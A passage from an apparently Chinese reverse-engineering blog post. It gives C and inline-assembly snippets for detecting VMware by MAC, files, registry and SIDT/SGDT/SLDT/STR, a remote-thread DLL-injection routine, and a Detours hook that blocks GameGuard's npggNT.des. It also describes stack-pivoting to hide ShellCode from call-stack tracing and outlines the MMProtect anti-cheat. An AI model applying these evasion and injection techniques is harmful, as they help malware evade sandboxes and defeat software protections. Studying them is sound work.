class="line">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">MAC地址检测</span><br><span class="line"></span><br><span class="line">虚拟机中MAC地址的头两个字节是000c或者0005</span><br><span class="line">ULONG	uInfo = GetAdaptersInfo(pAdapterInfo, &amp;ulOutBufLen);</span><br><span class="line">	pMac01 = (BYTE)pAdapterInfo-&gt;Address[0];</span><br><span class="line">	pMac02 = (BYTE)pAdapterInfo-&gt;Address[1];</span><br><span class="line"> </span><br><span class="line">	if (pMac01 == 0x00 &amp;&amp; (pMac02 == 0x0c || pMac02 == 0x05) )</span><br><span class="line">	    MessageBox(L&quot;IN VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">	else</span><br><span class="line">	    MessageBox(L&quot;Not in VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">进程检测</span><br><span class="line">vmtoolsd.exe，vmtoolsd.exe，VMwareTray.exe，vmacthlp.exe，VMUpgradeHelper.exe虚拟机中存在的进程。</span><br><span class="line">枚举方式可以有多种：</span><br><span class="line">1.创建进程快照（CreateToolhelp32Snapshot）</span><br><span class="line">2. 枚举进程和枚举进程模块，</span><br><span class="line">EnumProcesses和EnumProcessModules</span><br><span class="line">3.通过WMI接口查询进程。</span><br><span class="line"> </span><br><span class="line">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">文件检测</span><br><span class="line"></span><br><span class="line">通过打开虚拟机相关的文件进行判断</span><br><span class="line">例如：</span><br><span class="line">C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe</span><br><span class="line"></span><br><span class="line">    char  *szFile = &quot;C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe&quot;;</span><br><span class="line">    HANDLE hVmFile = CreateFileA(szFile, GENERIC_READ|GENERIC_WRITE,     FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);</span><br><span class="line">    if (hVmFile != INVALID_HANDLE_VALUE)</span><br><span class="line">        MessageBox(L&quot;In VM&quot;,L&quot;Check VM&quot;,MB_OK);    </span><br><span class="line">    else</span><br><span class="line">        MessageBox(L&quot;Not In VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">    CloseHandle(hVmFile);</span><br><span class="line"></span><br><span class="line">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">注册表检测</span><br><span class="line">注册表里对应的虚拟机的信息非常多，由此可以操作判断虚拟机。</span><br><span class="line">HKEY hKey = NULL;</span><br><span class="line">WCHAR * szSubKey = L&quot;SOFTWARE\\VMware, Inc.\\VMware Tools&quot;;</span><br><span class="line">ULONG uReg=RegOpenKeyEx(HKEY_LOCAL_MACHINE,szSubKey ,0,KEY_READ,&amp;hKey);</span><br><span class="line">if (uReg == ERROR_SUCCESS)</span><br><span class="line">     MessageBox(L&quot;In VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">else</span><br><span class="line">     MessageBox(L&quot;Not In VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">RegCloseKey(hKey);</span><br><span class="line"></span><br><span class="line">磁盘型号Model Number</span><br><span class="line">Disk Serial Number : &quot;WD-WMA9N2077672“</span><br><span class="line">Disk Model Number : &quot;WDC WD80EB-28CGH1 “</span><br><span class="line">Disk Serial Numbe : 硬盘序列号</span><br><span class="line">Disk Model Number : 硬盘型号</span><br><span class="line">我本机的Model Number是：ST350041CC66</span><br><span class="line">虚拟机中的Model Number:VMware,VMware Virtual S1.0</span><br><span class="line"></span><br><span class="line">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">显示卡检测</span><br><span class="line">虚拟机的显示卡名称是VMware SVGA II</span><br><span class="line"> if (EnumDisplayDevices(NULL, nDeviceIndex, &amp;DispDev, 0)) </span><br><span class="line">    &#123;  </span><br><span class="line">        hr = StringCchCopy((STRSAFE_LPWSTR)lpszMonitorInfo, 0x100, (STRSAFE_LPWSTR)DispDev.DeviceString);</span><br><span class="line">        if (FAILED(hr))</span><br><span class="line">        &#123;</span><br><span class="line">               return FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        bRet = FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">系统设备检测</span><br><span class="line">虚拟机中存在通讯接口设备和磁盘设备</span><br><span class="line">VMware VMCI Bus Device</span><br><span class="line">VMware, VMware Virtual S SCSI Disk Device</span><br><span class="line">通过枚举系统所有设备信息</span><br><span class="line">如果发现VMCI Device或者DISK Device就是在虚拟机中了</span><br><span class="line"></span><br><span class="line">IDT基址检测</span><br><span class="line">typedef struct</span><br><span class="line"> &#123;undefined</span><br><span class="line">WORD IDTLimit; // IDT的大小</span><br><span class="line">WORD LowIDTbase; // IDT的低位地址</span><br><span class="line">WORD HiIDTbase; // IDT的高位地址 </span><br><span class="line">&#125; IDTINFO;  </span><br><span class="line">Redpill作者(？不是bulepill么)在VMware上发现虚拟机系统上的IDT地址通常位于0xFFXXXXXX，而Virtual PC通常位于0xE8XXXXXX，而在真实主机上位于0x80xxxxxx。Redpill仅仅是通过判断执行SIDT指令后返回的第一字节是否大于0xD0，若是则说明它处于虚拟机，否则处于真实主机中。</span><br><span class="line"></span><br><span class="line">//////////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">LDT和GDT基址检测</span><br><span class="line">在保护模式下，所有的内存访问都要通过全局描述符表（GDT）或者本地描述符表（LDT）才能进行。这些表包含有段描述符的调用入口。各个段描述符都包含有各段的基址，访问权限，类型和使用信息，而且每个段描述符都拥有一个与之相匹配的段选择子，各个段选择子都为软件程序提供一个GDT或LDT索引（与之相关联的段描述符偏移量），一个全局/本地标志（决定段选择子是指向GDT还是LDT），以及访问权限信息。 若想访问段中的某一字节，必须同时提供一个段选择子和一个偏移量。段选择子（寄存器）为段提供可访问的段描述符地址（在GDT 或者LDT 中）。 GDT的线性基址被保存在GDT寄存器（GDTR）中，而LDT的线性基址被保存在LDT寄存器（LDTR）中。</span><br><span class="line"></span><br><span class="line">当LDT基址位于0x0000（只有两字节）时为真实主机，否则为虚拟    机，而当GDT基址位于0xFFXXXXXX时说明处于虚拟机中，否则为真实主机    </span><br><span class="line">           unsigned short ldt_addr = 0;</span><br><span class="line">    unsigned char ldtr[2] = &#123;0&#125;;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;undefined</span><br><span class="line">        sldt ldtr</span><br><span class="line">    &#125;</span><br><span class="line">        ldt_addr = *((unsigned short *)&amp;ldtr);</span><br><span class="line">    if(ldt_addr != 0x0000)</span><br><span class="line">    &#123;undefined</span><br><span class="line">        MessageBox(L&quot;IN VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;undefined</span><br><span class="line">        MessageBox(L&quot;Not in VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">GDT基址位于0xFFXXXXXX处于虚拟机中，真实机在x80XXXXXX</span><br><span class="line">    unsigned int gdt_addr = 0;</span><br><span class="line">    unsigned char gdtr[4];</span><br><span class="line"></span><br><span class="line">    _asm sgdt gdtr</span><br><span class="line">        gdt_addr = *((unsigned int *)&amp;gdtr[2]);</span><br><span class="line">    printf(&quot;GDT BaseAddr:0x%x\n&quot;, gdt_addr);</span><br><span class="line"></span><br><span class="line">    if((gdt_addr &gt;&gt; 24) == 0xff)</span><br><span class="line">    &#123;undefined</span><br><span class="line">        MessageBox(L&quot;IN VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;undefined</span><br><span class="line">        MessageBox(L&quot;Not in VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">///////////////////////////////////////////////////////////////////////////////////////////////</span><br><span class="line">STR检测</span><br><span class="line">在保护模式下运行的所有程序在切换任务时，对于当前任务中指向TSS的段选择器将会被存储在任务寄存器中，TSS中包含有当前任务的可执行环境状态，包括各种寄存器状态等等，当任务再次被执行时，处理器就会保存原先的任务状态。每项任务均有其自己的TSS，而我们可以通过STR指令来获取指向当前任务中TSS的段选择器。这里STR（Store task register）指令是用于将任务寄存器 (TR) 中的段选择器存储到目标操作数，目标操作数可以是通用寄存器或内存位置，使用此指令存储的段选择器指向当前正在运行的任务的任务状态段 (TSS)。在虚拟机和真实主机之中，通过STR读取的地址是不同的，当地址等于0x0040xxxx时，说明处于虚拟机中，否则为真实主机。</span><br><span class="line"></span><br><span class="line">Str将任务寄存器(TR) 中的段选择器存储到目标操作数</span><br><span class="line">    当地址等于x0040xxxx时，说明处于虚拟机中，否则为真实机</span><br><span class="line">    unsigned char mem[2] = &#123;0&#125;;</span><br><span class="line"></span><br><span class="line">    __asm str mem;</span><br><span class="line">    if ( (mem[0]==0x00) &amp;&amp; (mem[1]==0x40))</span><br><span class="line">    &#123;undefined</span><br><span class="line">        MessageBox(L&quot;IN VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;undefined</span><br><span class="line">        MessageBox(L&quot;Not in VM&quot;,L&quot;Check VM&quot;,MB_OK);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">///////////////////////////////////定义远程线程////////////////////////////////////////////</span><br><span class="line">static VOID WINAPI RemoteThread(LPVOID lpParam)</span><br><span class="line">&#123;       </span><br><span class="line">        PINJECTDATA myData=(PINJECTDATA)lpParam;</span><br><span class="line">        DWORD       dwGetModuleHandleA,</span><br><span class="line">                        dwLoadLibraryA,</span><br><span class="line">                                dwFreeLibrary,</span><br><span class="line">                                dwGetProcAddress,</span><br><span class="line">                    hKernel32;</span><br><span class="line"></span><br><span class="line">        dwGetModuleHandleA= (DWORD)myData-&gt;_GetModuleHandleA;</span><br><span class="line">        dwLoadLibraryA    = (DWORD)myData-&gt;_LoadLibraryA;</span><br><span class="line">        dwFreeLibrary     = (DWORD)myData-&gt;_FreeLibrary;</span><br><span class="line">        dwGetProcAddress  = (DWORD)myData-&gt;_GetProcAddress;</span><br><span class="line">        hKernel32         =        myData-&gt;hKernel32;</span><br><span class="line"></span><br><span class="line">    ///////////////////////下面的汇编代码是根据输出函数地址表找到相应的函数地址的RVA值////////////</span><br><span class="line">         _asm&#123;               </span><br><span class="line">                mov  ebx,hKernel32            // &lt;--- 这个是kernel32.dll的句柄,NP直接硬编码到这里</span><br><span class="line"></span><br><span class="line">                mov  eax,dwGetModuleHandleA</span><br><span class="line">                mov  edx,[eax]                // &lt;--- 根据地址表找出相应函数的RVA值</span><br><span class="line">                add  edx,ebx                  // &lt;--- 函数地址=模块加载基地址(即handle)+相应RVA值</span><br><span class="line">                mov  dwGetModuleHandleA,edx  </span><br><span class="line"></span><br><span class="line">                mov  eax,dwLoadLibraryA</span><br><span class="line">                mov  edx,[eax]</span><br><span class="line">                add  edx,ebx</span><br><span class="line">                mov  dwLoadLibraryA,edx</span><br><span class="line"></span><br><span class="line">                mov  eax,dwFreeLibrary</span><br><span class="line">                mov  edx,[eax]</span><br><span class="line">                add  edx,ebx</span><br><span class="line">                mov  dwFreeLibrary,edx</span><br><span class="line"></span><br><span class="line">                mov  eax,dwGetProcAddress</span><br><span class="line">                mov  edx,[eax]</span><br><span class="line">                add  edx,ebx</span><br><span class="line">                mov  dwGetProcAddress,edx</span><br><span class="line">        &#125;</span><br><span class="line">         ///////////////////////////////////////////////////////////////////</span><br><span class="line"></span><br><span class="line">    myData-&gt;_GetModuleHandleA= (GETMODULEHANDLEA)dwGetModuleHandleA;</span><br><span class="line">    myData-&gt;_LoadLibraryA    = (LOADLIBRARYA)    dwLoadLibraryA;</span><br><span class="line">    myData-&gt;_FreeLibrary     = (FREELIBRARY)     dwFreeLibrary;</span><br><span class="line">    myData-&gt;_GetProcAddress  = (GETPROCADDRESS)  dwGetProcAddress;</span><br><span class="line"></span><br><span class="line">    myData-&gt;_LoadLibraryA(myData-&gt;szLibraryPath); // 加载DLL</span><br><span class="line">        ////////////////////////////////////////////////////</span><br><span class="line">        //你可以在这里添加其他代码</span><br><span class="line">        //////////////////////////////////////////////////</span><br><span class="line">&#125;</span><br><span class="line">**********************************************************************************************************</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">HMODULE WINAPI MyLoadLibraryA(</span><br><span class="line">			 __in LPCSTR lpLibFileName</span><br><span class="line">			 )</span><br><span class="line">&#123;</span><br><span class="line">	if (strstr(lpLibFileName,&quot;npggNT.des&quot;)!=NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBoxA(NULL,&quot;kill npggNT.des 注入&quot;,NULL,0);</span><br><span class="line">		return NULL;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		return fnLoadLibraryA(lpLibFileName);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CAntiGGHookDlg::CAntiGGHookDlg(CWnd* pParent /*=NULL*/)</span><br><span class="line">	: CDialog(CAntiGGHookDlg::IDD, pParent)</span><br><span class="line">&#123;</span><br><span class="line">	m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void CAntiGGHookDlg::DoDataExchange(CDataExchange* pDX)</span><br><span class="line">&#123;</span><br><span class="line">	CDialog::DoDataExchange(pDX);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BEGIN_MESSAGE_MAP(CAntiGGHookDlg, CDialog)</span><br><span class="line">	ON_WM_SYSCOMMAND()</span><br><span class="line">	ON_WM_PAINT()</span><br><span class="line">	ON_WM_QUERYDRAGICON()</span><br><span class="line">	//&#125;&#125;AFX_MSG_MAP</span><br><span class="line">	ON_BN_CLICKED(IDOK, &amp;CAntiGGHookDlg::OnBnClickedOk)</span><br><span class="line">END_MESSAGE_MAP()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// CAntiGGHookDlg 消息处理程序</span><br><span class="line"></span><br><span class="line">BOOL CAntiGGHookDlg::OnInitDialog()</span><br><span class="line">&#123;</span><br><span class="line">	CDialog::OnInitDialog();</span><br><span class="line"></span><br><span class="line">	// 将“关于...”菜单项添加到系统菜单中。</span><br><span class="line"></span><br><span class="line">	// IDM_ABOUTBOX 必须在系统命令范围内。</span><br><span class="line">	ASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX);</span><br><span class="line">	ASSERT(IDM_ABOUTBOX &lt; 0xF000);</span><br><span class="line"></span><br><span class="line">	CMenu* pSysMenu = GetSystemMenu(FALSE);</span><br><span class="line">	if (pSysMenu != NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		CString strAboutMenu;</span><br><span class="line">		strAboutMenu.LoadString(IDS_ABOUTBOX);</span><br><span class="line">		if (!strAboutMenu.IsEmpty())</span><br><span class="line">		&#123;</span><br><span class="line">			pSysMenu-&gt;AppendMenu(MF_SEPARATOR);</span><br><span class="line">			pSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动</span><br><span class="line">	//  执行此操作</span><br><span class="line">	SetIcon(m_hIcon, TRUE);			// 设置大图标</span><br><span class="line">	SetIcon(m_hIcon, FALSE);		// 设置小图标</span><br><span class="line"></span><br><span class="line">	// TODO: 在此添加额外的初始化代码</span><br><span class="line">	HMODULE dllhandle = NULL;</span><br><span class="line">	if (GetModuleHandleA(&quot;kernel32.dll&quot;) != NULL)</span><br><span class="line">	&#123;</span><br><span class="line">		dllhandle = GetModuleHandleA(&quot;kernel32.dll&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		dllhandle = LoadLibraryA(&quot;kernel32.dll&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	DetourTransactionBegin();</span><br><span class="line">	DetourUpdateThread(GetCurrentThread());</span><br><span class="line"></span><br><span class="line">	fnLoadLibraryA = (lpfunLoadLibraryA)GetProcAddress(dllhandle, &quot;LoadLibraryA&quot;);</span><br><span class="line">	DetourAttach(&amp;(PVOID&amp;)fnLoadLibraryA, MyLoadLibraryA);</span><br><span class="line">	DetourTransactionCommit();</span><br><span class="line">	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="dll-隐藏"><a class="markdownIt-Anchor" href="#dll-隐藏">#</a> DLL 隐藏</h3>
<h3 id="基于调用栈及call检测方法一"><a class="markdownIt-Anchor" href="#基于调用栈及call检测方法一">#</a> 基于调用栈及 CALL 检测方法（一）</h3>
<ol>
<li>
<p>原理</p>
<p>函数调用 CALL 指令可拆分为两步操作：</p>
<p>1)、将调用者的下一条指令（EIP）的地址压栈</p>
<p>2)、跳转至将要调用的函数地址中（相对偏移或绝对地址）</p>
<p>那么在执行到子函数首地址位置时，返回地址（即调用函数中调用位置下一条指令的地址）就已经存在于堆栈中了，并且是 ESP 指向地址的值。下面通过栈帧的概念，了解编译器在接下来对堆栈进行的操作。</p>
<p>简言之，栈帧就是利用 EBP（栈帧指针，请注意不是 ESP）寄存器访问栈内部局部变量、参数、函数返回地址等的手段。程序运行中，ESP 寄存器的值随时变化，访问栈中函数的局部变量、参数时，若以 ESP 值为基准编写程序会十分困难，并且也很难使 CPU 引用到正确的地址。</p>
<p>所以，调用某函数时，先要把用作基准点（函数起始地址）的 ESP 值保存到 EBP，并维持在函数内部。这样，无论 ESP 的值如何变化，以 EBP 的值为基准能够安全访问到相关函数的局部变量、参数、返回地址，这就是 EBP 寄存器作为栈帧指针的作用。</p>
<p>在函数体代码的任何位置，EBP 寄存器指向的地址始终存储属于它的调用函数的 EBP 的值，根据这个原理可逐级向调用函数、调用函数的调用函数进行遍历，向上回溯。</p>
<p>这样有什么用呢？在将属于调用函数的 EBP 的值压栈之前，ESP 指向的地址存储的是由 CALL 指令压栈的调用函数中调用位置的下一条指令的地址（原 EIP）。那么根据这个逻辑，可以通过上面回溯的各级 EBP 的值，并根据 EBP+sizeof (ULONG_PTR) 获取到函数调用者函数体中的地址（当前函数的返回地址）。有了每级调用的函数体中的地址，那么获取该函数的详细信息及函数符号就变得容易了</p>
<p>2. 对抗思路<br>
分配内存地址作为基地址的内存空间，并将以当前 ESP 为基地址的一段栈内存片段的数据拷贝到了新分配的内存空间的高内存区域中，修改 ESP 和 EBP 寄存器的值为新缓冲区中对应的两个寄存器指针应该指向的位置，相当于对堆栈片段进行了平移。</p>
<p>平移时首先根据 ESP 和 EBP 寄存器指向的内存地址定位需要拷贝的数据范围。在这里可能会向 EBP 指向的地址上面多拷贝一部分数据，以将参数和返回地址等数据一并拷贝到新分配的缓冲区中。拷贝完成之后，将 ESP 和 EBP 寄存器指向新缓冲区中对应的位置。</p>
<p>这时开始程序对堆栈的操作将会在新分配的内存缓冲区中进行。在 ShellCode 代码执行即将完成时，应会再将 ESP 和 EBP 的值还原回原来真正栈里的地址，避免弹栈时进入上面未知的内存区域导致程序异常。</p>
</li>
<li>
<p>验证</p>
</li>
<li>
<p>为了验证这个判断是否有效和真实，接下来需要实现上面猜想中描述的操作，看看调试器或检测系统是否能够成功地进行栈回溯。</p>
<p>下面的代码片段实现了分配新的缓冲区，并拷贝从 ESP 指针指向位置到 调用函数的 EBP 在栈中存储位置加上调用函数的返回地址的存储位置这个范围的栈片段，到新分配的缓冲区中最高位置区域，为低内存预留了 0x100000 字节的空间。</p>
</li>
</ol>
<h2 id="mmprotect登录器保护介绍与分析一"><a class="markdownIt-Anchor" href="#mmprotect登录器保护介绍与分析一">#</a> MMProtect 登录器保护介绍与分析（一）</h2>
<ol>
<li>
<p>1. 驱动级外挂拦截</p>
<p>​        有一定安全经验的人都知道，Ring3 层的防护只是一层窗户纸，一捅即破。MMProtect 采用应用层和内核层双重保护，互相协调工作，检测游戏进程中加载的模块是否包含非法特征码。</p>
<p>2. 游戏进程防护</p>
<p>​    一些常用的内存读写及调试工具会对被保护的进程进行诸如打开、读、写操作。MMProtect 保护下的进程，有效禁止这些敏感操作，使得传统调试工具无法对游戏进程进行调试和分析。</p>
<p>3. 游戏防调试分析</p>
<p>除了对常规内存操作的防护外，MMProtect 中加入了对应用层调试模型的修改，使得即便外挂作者通过某些手段过掉了常规内存读写限制，依然不能对游戏进程进行调试。更有效保证了游戏进程的安全。</p>
<p>4. 代码自校验</p>
<p>​    安全系统本身对系统的修改，不允许以任何方式恢复，MMProtect 内部实现了强大的自校验功能，当 MMProtect 系统的任何一处遭受攻击，都会导致系统及时终止游戏进程或操作系统，有效保证了安全系统自身的安全性。只有在安全系统自身足够安全的情况下，才能为游戏进程提供有效的保护。</p>
<p>5. 外挂云查杀</p>
<p>对抗外挂的传统方式是，通过游戏更新的手段使得已发现的外挂失效。加入 MMProtect 系统的游戏，实时连接到云端，对游戏模块进行校验，如发现游戏进程加载了非法模块，第一时间就会报错结束游戏进程。而这一过程，不需要对游戏本身做任何修改和更新。</p>
<p>6. 高效率</p>
<p>MMProtect 虽然使用与杀软同样的过滤拦截技术，但其目的明确，校验算法十分高效，可以达到使用 MMProtect 和未使用时效率几乎相同，不会对系统造成卡顿等影响。云查杀在云端校验，不使用本地资源，只需少量的通信即可完成。</p>
</li>
</ol>

      <div class="tags">
          <a href="/tags/%E9%80%86%E5%90%91/" rel="tag"><i class="ic i-tag"></i> 逆向</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2023-12-20 23:16:25" itemprop="dateModified" datetime="2023-12-20T23:16:25+08:00">2023-12-20</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="John Doe Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="John Doe PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2023/10/01/1234567/" title="windows逆向进阶">http://example.com/2023/10/01/1234567/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2023/09/15/%E7%BC%93%E5%AD%98%E6%B1%A1%E6%9F%93/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;img.timelessq.com&#x2F;images&#x2F;2022&#x2F;07&#x2F;26&#x2F;488297bfd0233b6c6a444f1860e55d45.jpg" title="缓存污染&#x2F;请求走私">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>缓存污染/请求走私</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2023/10/03/hg%20ker/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;img.timelessq.com&#x2F;images&#x2F;2022&#x2F;07&#x2F;26&#x2F;d57fb656daeae8c85814e95768e6cedf.jpg" title="hg内核">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> 逆向</span>
  <h3>hg内核</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#windows-%E9%80%86%E5%90%91"><span class="toc-number">1.</span> <span class="toc-text"> Windows 逆向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#winapi%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.1.</span> <span class="toc-text"> WinApi 速查表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#getmodulefilename"><span class="toc-number">1.1.1.</span> <span class="toc-text"> GetModuleFileName</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c%E8%AF%AD%E8%A8%80"><span class="toc-number">1.2.</span> <span class="toc-text"> C 语言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 进制转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 数据类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> 常见的数据类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BF%90%E7%AE%97%E7%AC%A6%E7%B1%BB%E5%9E%8B%E9%87%8D%E8%A6%81"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> 常见的运算符类型（重要）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E6%A0%88"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 堆栈</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#hello-world"><span class="toc-number">1.2.3.1.</span> <span class="toc-text"> hello world</span></a></li><li class="toc-item 